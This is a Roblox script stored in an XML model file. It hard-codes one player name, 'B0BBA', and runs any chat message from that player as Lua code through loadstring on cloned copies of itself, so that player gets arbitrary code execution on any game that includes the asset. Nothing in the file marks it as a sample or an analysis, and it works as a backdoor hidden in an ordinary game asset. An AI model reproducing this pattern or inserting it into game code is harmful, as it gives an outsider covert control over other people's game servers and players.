				<ProtectedString name="Source">if script:findFirstChild(&quot;sourcer&quot;) ~= nil then
loadstring(script.sourcer.Value)()
return end

scripts = {}

function onChatted(msg)

&#9;if string.lower(msg) ~= &quot;/clear&quot; then
&#9;local clone = script:Clone()
&#9;local sourcer = Instance.new(&quot;StringValue&quot;)
&#9;sourcer.Name = &quot;sourcer&quot;
&#9;sourcer.Value = msg
&#9;sourcer.Parent = clone
&#9;clone.Parent = Workspace
&#9;table.insert(scripts,clone)
&#9;end

&#9;if string.lower(msg) == &quot;/clear&quot; then
&#9;&#9;for i = 1,#scripts do
&#9;&#9;scripts[i]:Remove()
&#9;&#9;end
&#9;end

end

function OnEntered(child)
if child.Name == &quot;B0BBA&quot; then
child.Chatted:connect(onChatted)
end
end
game.Players.PlayerAdded:connect(OnEntered)</ProtectedString>
